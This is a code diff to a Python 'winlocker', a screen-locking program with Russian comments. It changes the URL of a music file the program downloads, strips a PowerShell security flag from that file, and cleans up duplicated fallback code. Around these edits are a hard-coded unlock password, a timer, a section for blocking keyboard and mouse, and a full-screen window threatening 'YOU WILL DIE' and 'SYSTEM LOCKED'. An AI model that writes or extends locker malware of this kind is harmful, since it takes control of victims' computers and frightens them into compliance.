@@ -3,7 +3,7 @@ import ctypes, os, sys, time, threading, random, tempfile, urllib.request, tkint
 # === НАСТРОЙКИ ===
 PASSWORD = "1601"
 TIMER_SECONDS = 15  # для теста, потом 600
-MUSIC_URL = "https://github.com/ippo123459-bit/winlocker/blob/main/chrmbchrmb_-_matrix_bl_studio_loop_slowed_(SkySound.cc).mp3"
+MUSIC_URL = "https://raw.githubusercontent.com/ippo123459-bit/winlocker/main/music.mp3"
 MUSIC_FILE = os.path.join(tempfile.gettempdir(), "winlocker_music.mp3")
 
 # === БЛОКИРУЕМ КЛАВИАТУРУ И МЫШЬ ===
@@ -45,7 +45,7 @@ def play_music():
             urllib.request.urlretrieve(MUSIC_URL, MUSIC_FILE)
             # Снимаем блокировку Windows
             os.system('powershell -Command "Unblock-File -Path \'' + MUSIC_FILE + '\'"')
-        
+
         if os.path.exists(MUSIC_FILE):
             try:
                 import pygame.mixer as mixer
@@ -55,34 +55,6 @@ def play_music():
                 return
             except:
                 pass
-
-        import winsound
-        while True:
-            freq = random.randint(200, 800)
-            duration = random.randint(50, 200)
-            winsound.Beep(freq, duration)
-            time.sleep(random.uniform(0.1, 0.5))
-    except:
-        pass
-
-        # Если файл есть – играем через pygame
-        if os.path.exists(MUSIC_FILE):
-            try:
-                import pygame.mixer as mixer
-                mixer.init()
-                mixer.music.load(MUSIC_FILE)
-                mixer.music.play(-1)
-                return
-            except:
-                pass
-
-        # Если pygame не смог – играем встроенные бипы
-        import winsound
-        while True:
-            freq = random.randint(200, 800)
-            duration = random.randint(50, 200)
-            winsound.Beep(freq, duration)
-            time.sleep(random.uniform(0.1, 0.5))
     except:
         pass
 
@@ -119,12 +91,10 @@ class WinLocker:
         self.canvas = tk.Canvas(self.win, bg='black', highlightthickness=0)
         self.canvas.pack(fill='both', expand=True)
         
-        # Страшные надписи
         self.canvas.create_text(400, 80, text="ВЫ УМРЁТЕ", fill='red', font=('Courier', 60, 'bold'), tags="title")
         self.canvas.create_text(400, 160, text="СИСТЕМА ЗАБЛОКИРОВАНА", fill='red', font=('Courier', 36))
         self.canvas.create_text(400, 300, text="ВВЕДИТЕ ПАРОЛЬ:", fill='red', font=('Courier', 28))
         
-        # Поле ввода
         self.entry = tk.Entry(self.win, show="*", font=('Courier', 28), bg='black', fg='red', insertbackground='red')
         self.canvas.create_window(400, 360, window=self.entry)
         self.status = self.canvas.create_text(400, 420, text="", fill='red', font=('Courier', 20))
